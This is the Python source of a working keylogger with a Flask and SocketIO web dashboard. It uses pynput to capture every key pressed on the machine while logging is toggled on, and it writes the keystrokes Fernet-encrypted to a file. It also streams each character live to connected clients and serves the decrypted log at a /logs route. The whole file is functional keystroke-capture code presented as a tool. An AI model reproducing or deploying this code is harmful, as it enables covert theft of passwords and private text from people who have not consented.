import os
import time
from flask import Flask, jsonify, render_template, request
from flask_socketio import SocketIO, emit
from pynput import keyboard
from datetime import datetime
from cryptography.fernet import Fernet
from threading import Thread

app = Flask(__name__)
socketio = SocketIO(app)

# Global variables
running = True
logging_enabled = False
log_file = "keyfile.txt"
encryption_key_file = "key.key"
start_time = None
end_time = None

# Function to generate encryption key
def generate_key():
    key = Fernet.generate_key()
    with open(encryption_key_file, "wb") as key_file:
        key_file.write(key)

# Function to load encryption key
def load_key():
    return open(encryption_key_file, "rb").read()

# Function to encrypt data
def encrypt_data(data, key):
    fernet = Fernet(key)
    return fernet.encrypt(data.encode())

# Function to decrypt data
def decrypt_data(data, key):
    fernet = Fernet(key)
    return fernet.decrypt(data).decode()

# Function to stop the keylogger
def stop_keylogger():
    global running
    running = False

# Start the keylogger
def start_keylogger():
    global running
    running = True
    if not os.path.exists(encryption_key_file):
        generate_key()
    key = load_key()
    with open(log_file, "wb") as logKey:
        logKey.write(encrypt_data("", key))  # Clear existing content or create a new file
    with keyboard.Listener(on_press=key_pressed, on_release=key_released) as listener:
        listener.join()

# Function to toggle the logging state
@app.route('/toggle_logging', methods=['POST'])
def toggle_logging():
    global logging_enabled, start_time, end_time
    logging_enabled = not logging_enabled
    if logging_enabled:
        start_time = time.time()
        print("Logging enabled")
    else:
        end_time = time.time()
        print("Logging disabled")
        analyze_keystrokes()
    return jsonify({'logging_enabled': logging_enabled})

# Function to handle key presses
def key_pressed(key):
    global logging_enabled
    try:
        if logging_enabled:
            char = key.char if key.char != ' ' else ' '
            log_key(char)
    except AttributeError:
        pass

# Function to handle key releases
def key_released(key):
    pass

# Function to log keystrokes with encryption
def log_key(char):
    key = load_key()
    encrypted_char = encrypt_data(char, key)
    with open(log_file, "ab") as logKey:
        logKey.write(encrypted_char + b'\n')
    socketio.emit('new_keystroke', {'char': char})

# Function to analyze the keystrokes
def analyze_keystrokes():
    key = load_key()
    with open(log_file, "rb") as logKey:
        decrypted_keys = [decrypt_data(line.strip(), key) for line in logKey]
    duration = end_time - start_time
    total_keys = len(decrypted_keys)
    unique_keys = len(set(decrypted_keys))
    print(f"Duration: {duration} seconds")
    print(f"Total keystrokes: {total_keys}")
    print(f"Unique keystrokes: {unique_keys}")
    socketio.emit('analytics', {
        'duration': duration,
        'total_keys': total_keys,
        'unique_keys': unique_keys
    })

# Route to fetch the logged keystrokes
@app.route('/logs')
def get_logs():
    key = load_key()
    logs = []
    with open(log_file, "rb") as logKey:
        for line in logKey:
            logs.append(decrypt_data(line.strip(), key))
    return jsonify(logs)

# Route to clear the logged keystrokes
@app.route('/clear_logs', methods=['POST'])
def clear_logs():
    key = load_key()
    with open(log_file, "wb") as logKey:
        logKey.write(encrypt_data("", key))
    return jsonify({'status': 'logs cleared'})

# Route to serve the HTML page
@app.route('/')
def index():
    return render_template('index.html')

if __name__ == "__main__":
    # Start the keylogger in a separate thread
    keylogger_thread = Thread(target=start_keylogger)
    keylogger_thread.start()
    
    # Start the Flask web server with SocketIO
    socketio.run(app, debug=True)
